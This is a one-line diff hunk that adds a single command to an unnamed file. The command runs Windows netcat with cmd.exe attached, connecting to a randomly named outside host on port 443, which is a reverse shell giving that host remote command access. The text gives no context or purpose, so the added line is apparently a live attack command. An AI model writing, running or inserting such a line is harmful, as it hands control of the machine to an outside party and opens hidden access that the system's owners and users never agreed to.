@@ -1,0 +1,1 @@
+nc.exe -e cmd.exe o0psegnzd7626b3lq9wmicjt6kcdg15.c.39.rs 443
